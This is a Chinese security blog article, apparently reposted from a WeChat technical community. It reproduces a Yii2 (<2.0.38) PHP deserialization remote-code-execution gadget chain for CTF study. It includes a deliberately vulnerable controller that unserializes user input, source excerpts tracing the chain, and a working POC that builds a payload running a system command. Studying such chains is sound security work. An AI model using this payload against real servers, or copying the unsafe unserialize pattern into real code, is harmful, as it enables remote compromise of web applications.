> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/k0NVC8vcW8nyr9KJ02kDOg)

**文章源自【字节脉搏社区】- 字节脉搏实验室**

**作者 - purplet**

**扫描下方二维码进入社区：**

**![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnK3Fc7MgHHCICGGSg2l58vxaP5QwOCBcU48xz5g8pgSjGds3Oax0BfzyLkzE9Z6J4WARvaN6ic0GRQ/640?wx_fmt=png)**

一、漏洞简介
------

如果在使用 yii 框架，并且在用户可以控制的输入处调用了 unserialize() 并允许特殊字符的情况下，会受到反序列化远程命令命令执行漏洞攻击。

该漏洞只是 php 反序列化的执行链，必须要配合`unserialize`函数才可以达到任意代码执行的危害。

二、漏洞影响
------

Yii2 <2.0.38

三、复现过程
------

目前该框架版本已经到 2.0.42 了，而复现该漏洞是因为最近的 CTF 比赛中已经出现了好几次该框架漏洞的改造题目了，所以我觉得有必要好好对该漏洞进行一个认真的审计复现。

首先从 github 上下载漏洞源码：https://github.com/yiisoft/yii2/releases/download/2.0.37/yii-basic-app-2.0.37.tgz

解压到 Web 目录，然后修改一下配置文件。

/config/web.php:

![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnJttqK06OObGEibYDURqt6EMoicKzsiaqzh07VpZmHCVpWfAicG4xnvRxz7pbASVhtJdYEo9dwsRvFpBg/640?wx_fmt=png)

给 cookieValidationKey 字段设置一个值”test”  
接着添加一个存在漏洞的 Action  
/controllers/TestController.php:

```
<?php 
namespace app\controllers;
use Yii;
use yii\web\Controleer;

class TestController extends Controller
{
    public function actionTest(){
        $name = Yii:$app->request->get('unserialize');
        return unserialize(base64_decode($name));
    }
}
?>
```

之前 2021 年红帽杯的这道题是直接在 / controllers/SiteController.php 里修改了 actionAbout 方法里修改为如下所示，其实本质上与原漏洞是相同的

```
public function actionAbout($message = 'Hello')
{
    $data = base64_decode($message);
    unserialize($data);
}
```

反序列化起点

/vendor/yiisoft/yii2/db/BatchQueryResult.php:

```
<?php
namespace yii\db;

class BatchQueryResult{
    /** 
    ......
    */
    public function __destruct()
    {
        $this->reset();
    }

    public function reset()
    {
        if ($this->_dataReader !== null) {
            $this->_dataReader->close();
        }
        $this->_dataReader = null;
        $this->_batch = null;
        $this->_value = null;
        $this->_key = null;
    }
    /** 
    ......
    */
}
?>
```

可以看到__destruct() 调用了 reset() 方法  
reset() 方法中，$this->_dataReader 是可控的，所以此处可以当做跳板，去执行其他类中的__call() 方法。

__call() // 当调用对象中不存在的方法时触发

然后找到一个 Faker\Generator 类

/vendor/fzaninotto/faker/src/Faker/Generator.php:

```
<?php
namespace Faker;

class Generator{
    /** 
    ......
    */
    public function format($formatter, $arguments = array())
    {
        return call_user_func_array($this->getFormatter($formatter), $arguments);
    }

    public function getFormatter($formatter)
    {
        if (isset($this->formatters[$formatter])) {
            return $this->formatters[$formatter];
        }
        foreach ($this->providers as $provider) {
            if (method_exists($provider, $formatter)) {
                $this->formatters[$formatter] = array($provider, $formatter);

                return $this->formatters[$formatter];
            }
        }
        throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
    }

    public function __call($method, $attributes)
    {
        return $this->format($method, $attributes);
    }
    /** 
    ......
    */
}
?>
```

可以看到，此处的__call() 方法调用了 format()，且 format() 从 $this->getFormatter($formatter) 里面取出对应的值后，带入了 call_user_func_array() 函数中。  
由于 $this->formatter 是我们可控的，所以我们这里可以调用任意类中的任意方法了。  
但是 $arguments 是从 yii\db\BatchQueryResult::reset() 里传过来的，我们不可控，所以我们只能不带参数地去调用别的类中的方法。

到了这一步只需要找到一个执行类即可。  
我们可以使用 Seay 源代码审计的正则全局搜索 call_user_func\(\$this->([a-zA-Z0-9]+),  
\$this->([a-zA-Z0-9]+)，得到使用了 call_user_func 函数，且参数为类中成员变量的所有方法。

![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnJttqK06OObGEibYDURqt6EMnEicKzQDOurnj61iaZJun7yt3dap5GyEzvUicjRl0R9VgaE2EZosjfRtA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnJttqK06OObGEibYDURqt6EMyRVgjXAwStFTxiaFynn7tPFg62GPFXib6lN9RkABWets0Cc2iaMzqCn3A/640?wx_fmt=png)

查看后发现 yii\rest\CreateAction::run() 和 yii\rest\IndexAction::run() 这两个方法比较合适。  
这里拿 yii\rest\CreateAction::run() 举例  
/vendor/yiisoft/yii2/rest/CreateAction.php:

<table cellpadding="0" cellspacing="0" width="603"><tbody><tr><td width="NaN">1234567891011121314151617181920212223242526272829303132333435</td><td width="558"><code>&lt;?php</code><code>namespace</code>&nbsp;<code>yii\rest;</code>&nbsp;<code>class</code>&nbsp;<code>CreateAction{</code><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>/**&nbsp;</code><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>......</code><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>*/</code><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>public</code>&nbsp;<code>function</code>&nbsp;<code>run()</code><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>{</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code>&nbsp;<code>(</code><code>$this</code><code>-&gt;checkAccess)&nbsp;{</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>call_user_func(</code><code>$this</code><code>-&gt;checkAccess,&nbsp;</code><code>$this</code><code>-&gt;id);</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code>&nbsp;<code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>/*&nbsp;@var&nbsp;$model&nbsp;\yii\db\ActiveRecord&nbsp;*/</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$model</code>&nbsp;<code>=&nbsp;</code><code>new</code>&nbsp;<code>$this</code><code>-&gt;modelClass([</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>'scenario'</code>&nbsp;<code>=&gt;&nbsp;</code><code>$this</code><code>-&gt;scenario,</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>]);</code>&nbsp;<code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$model</code><code>-&gt;load(Yii::</code><code>$app</code><code>-&gt;getRequest()-&gt;getBodyParams(),&nbsp;</code><code>''</code><code>);</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code>&nbsp;<code>(</code><code>$model</code><code>-&gt;save())&nbsp;{</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$response</code>&nbsp;<code>=&nbsp;Yii::</code><code>$app</code><code>-&gt;getResponse();</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$response</code><code>-&gt;setStatusCode(201);</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$id</code>&nbsp;<code>=&nbsp;implode(</code><code>','</code><code>,&nbsp;</code><code>array_values</code><code>(</code><code>$model</code><code>-&gt;getPrimaryKey(true)));</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>$response</code><code>-&gt;getHeaders()-&gt;set(</code><code>'Location'</code><code>,&nbsp;Url::toRoute([</code><code>$this</code><code>-&gt;viewAction,&nbsp;</code><code>'id'</code>&nbsp;<code>=&gt;&nbsp;</code><code>$id</code><code>],&nbsp;true));</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}&nbsp;</code><code>elseif</code>&nbsp;<code>(!</code><code>$model</code><code>-&gt;hasErrors())&nbsp;{</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>throw</code>&nbsp;<code>new</code>&nbsp;<code>ServerErrorHttpException(</code><code>'Failed&nbsp;to&nbsp;create&nbsp;the&nbsp;object&nbsp;for&nbsp;unknown&nbsp;reason.'</code><code>);</code><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code>&nbsp;<code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>return</code>&nbsp;<code>$model</code><code>;</code><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>}</code><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>/**&nbsp;</code><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>......</code><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>*/</code><code>}</code><code>?&gt;</code></td></tr></tbody></table>

$this->checkAccess 和 $this->id 都是我们可控的。所以整个利用链就出来了。

```
yii\db\BatchQueryResult::__destruct()
->
Faker\Generator::__call()
->
yii\rest\CreateAction::run()
```

构造 POC 如下：

```
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls -al';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```

参考连接

https://xz.aliyun.com/t/8307

**通知！**

**公众号招募文章投稿小伙伴啦！只要你有技术有想法要分享给更多的朋友，就可以参与到我们的投稿计划当中哦~ 感兴趣的朋友公众号首页菜单栏点击【商务合作 - 我要投稿】即可。期待大家的参与~**

**![](https://mmbiz.qpic.cn/mmbiz_jpg/ia3Is12pQKnKRau1qLYtgUZw8e6ENhD9UWdh6lUJoISP3XJ6tiaibXMsibwDn9tac07e0g9X5Q6xEuNUcSqmZtNOYQ/640?wx_fmt=jpeg)**

**记得扫码**

**关注我们**